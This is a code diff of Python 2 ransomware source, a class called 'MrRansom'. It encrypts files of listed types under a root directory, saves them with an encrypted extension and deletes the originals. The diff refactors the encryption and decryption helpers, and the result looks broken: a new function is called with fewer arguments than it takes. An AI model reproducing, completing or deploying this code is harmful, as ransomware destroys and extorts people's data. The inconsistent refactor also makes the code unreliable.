@@ -45,6 +45,10 @@ def encryptable_file_types():
     return [file_type for file_type in types_json["fileTypes"]]
 
 
+def do_nothing(input):
+    return input
+
+
 class MrRansom:
 
     def __init__(self, key, root_dir):
@@ -65,7 +69,7 @@ class MrRansom:
         start_time = time.time()
 
         out_file_path = file_path + ENCRYPTED_EXTENSION
-        self.process(file_path, out_file_path, self.algorithm.encrypt_chunk)
+        self.algorithm.encrypt(self.get_contents(file_path), out_file_path)
 
         print "Encrypted '{}' in {}s".format(os.path.basename(file_path), time.time() - start_time)
 
@@ -73,20 +77,20 @@ class MrRansom:
         start_time = time.time()
 
         out_file_path = file_path[:len(file_path) - len(ENCRYPTED_EXTENSION)]
-        self.process(file_path, out_file_path, self.algorithm.decrypt_chunk)
+        self.algorithm.decrypt_file(file_path, out_file_path)
 
         print "Decrypted '{}' in {}s".format(os.path.basename(out_file_path), time.time() - start_time)
 
     @staticmethod
-    def process(in_file_path, out_file_path, process):
+    def get_contents(in_file_path, process):
         in_file = open(in_file_path, "rb")
-        out_file = open(out_file_path, "w")
 
+        processed = ""
         for chunk in read_chunks(in_file):
-            write_chunk(out_file, process(chunk))
+            processed += process(chunk)
 
         in_file.close()
-        out_file.close()
 
         os.remove(in_file_path)
 
+        return processed
